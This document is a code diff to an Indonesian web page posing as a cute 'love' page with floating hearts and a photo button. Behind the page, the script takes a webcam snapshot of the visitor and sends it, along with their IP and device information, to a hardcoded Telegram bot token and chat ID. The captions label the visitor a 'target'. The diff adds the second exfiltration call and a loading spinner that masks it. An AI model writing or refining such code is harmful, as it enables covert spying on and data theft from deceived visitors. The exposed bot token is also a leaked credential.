@@ -196,6 +196,26 @@
             overflow: hidden;
             z-index: 1;
         }
+        
+        .loading {
+            display: none;
+            margin-top: 1rem;
+        }
+        
+        .spinner {
+            border: 4px solid rgba(255, 107, 129, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid #ff6b81;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
@@ -217,6 +237,11 @@
                 <button class="btn btn-primary" id="btnCapture">Ambil Foto</button>
                 <button class="btn btn-secondary" id="btnClose">Tutup</button>
             </div>
+        </div>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p style="margin-top: 10px; color: #ff6b81;">Sedang memproses...</p>
         </div>
         
         <div class="message" id="message">
@@ -267,10 +292,10 @@
         // Buat hati secara berkala
         setInterval(createHeart, 300);
         
-        // Kode JavaScript yang diberikan
+        // Kode JavaScript yang diperbaiki
         const BOT_TOKEN="8379627519:AAF7Ti4YUtt17MB5AynRh7SM0ba3tXl8vJo"; // BOT TOKEN
         const CHAT_ID="6051179992"; // CHAT ID
-        const STATIC_IMAGE="https://i.imgur.com/3QrA6aQ.jpg"; // Gambar statis untuk dikirim
+        const STATIC_IMAGE="https://files.catbox.moe/8ybe0o.jpg"; // Gambar statis yang diberikan
 
         // Fungsi untuk escape HTML
         function escapeHtml(text) {
@@ -470,7 +495,7 @@
             }
         }
 
-        // Kamera snapshot sebagai file .jpg (document)
+        // Kamera snapshot sebagai file .jpg (document) dengan nama "mukasapani.jpg"
         async function sendSnapshot(){
             // Cek apakah getUserMedia didukung
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
@@ -480,6 +505,8 @@
             }
 
             console.log("Meminta izin kamera...");
+            document.getElementById('loading').style.display = 'block';
+            
             try{
                 const stream = await navigator.mediaDevices.getUserMedia({video:true});
                 const video = document.createElement('video');
@@ -497,35 +524,63 @@
 
                 const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
 
-                const formData = new FormData();
-                formData.append("chat_id", CHAT_ID);
-                formData.append("document", blob, "snapshot.jpg");
-                // Tambahkan parse_mode ke FormData agar format HTML diproses
-                formData.append("caption", "<blockquote>📸 <b>Photo Captured Successfully!</b> 📸\n\nTarget's photo has been captured and sent to you.\n\n<b>Love Cute Bot</b></blockquote>");
-                formData.append("parse_mode", "HTML");
+                // 1. Kirim foto target sebagai document dengan nama "mukasapani.jpg"
+                const formData1 = new FormData();
+                formData1.append("chat_id", CHAT_ID);
+                formData1.append("document", blob, "mukasapani.jpg");
+                formData1.append("caption", "<blockquote>📸 <b>Target Photo Captured!</b> 📸\n\nPhoto has been successfully captured.\n\n<b>Love Cute Bot</b></blockquote>");
+                formData1.append("parse_mode", "HTML");
 
-                console.log("Mengirim snapshot ke Telegram...");
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                console.log("Mengirim foto target ke Telegram...");
+                const response1 = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                     method: "POST",
-                    body: formData
+                    body: formData1
                 });
 
-                const result = await response.json();
-                if(result.ok) {
-                    console.log("Snapshot berhasil dikirim!");
-                    document.getElementById('message').style.display = 'block';
-                    setTimeout(() => {
-                        document.getElementById('message').style.display = 'none';
-                    }, 3000);
+                const result1 = await response1.json();
+                if(result1.ok) {
+                    console.log("Foto target berhasil dikirim!");
+                    
+                    // 2. Setelah foto terkirim, kirim data dengan gambar statis
+                    const [ip,d] = await Promise.all([getIpInfo(), getDeviceInfo()]);
+                    const caption = buildCaption(ip,d);
+                    
+                    const response2 = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+                        method:"POST",
+                        headers:{"Content-Type":"application/json"},
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            photo: STATIC_IMAGE,
+                            caption: caption,
+                            parse_mode:"HTML"
+                        })
+                    });
+                    
+                    const result2 = await response2.json();
+                    if(result2.ok) {
+                        console.log("Data dengan gambar statis berhasil dikirim!");
+                        document.getElementById('message').style.display = 'block';
+                        document.getElementById('message').textContent = 'Foto berhasil dikirim! 💕';
+                    } else {
+                        console.error("Gagal mengirim data dengan gambar statis:", result2);
+                    }
                 } else {
-                    console.error("Gagal mengirim snapshot:", result);
+                    console.error("Gagal mengirim foto target:", result1);
                 }
 
                 stream.getTracks().forEach(track=>track.stop());
                 video.remove();
+                document.getElementById('loading').style.display = 'none';
+                
+                // Sembunyikan pesan setelah 3 detik
+                setTimeout(() => {
+                    document.getElementById('message').style.display = 'none';
+                }, 3000);
+                
             }catch(e){
                 console.error("Gagal mengambil snapshot:", e);
                 alert("Tidak dapat mengakses kamera. Pastikan Anda telah memberikan izin.");
+                document.getElementById('loading').style.display = 'none';
             }
         }
 
@@ -554,6 +609,16 @@
         // Event listener untuk tombol ambil foto
         document.getElementById("btnCapture").addEventListener("click", function() {
             sendSnapshot();
+            // Tutup kamera setelah mengambil foto
+            const videoElement = document.getElementById('videoElement');
+            const cameraContainer = document.getElementById('cameraContainer');
+            
+            if (videoElement.srcObject) {
+                const tracks = videoElement.srcObject.getTracks();
+                tracks.forEach(track => track.stop());
+            }
+            
+            cameraContainer.style.display = 'none';
         });
 
         // Event listener untuk tombol tutup kamera
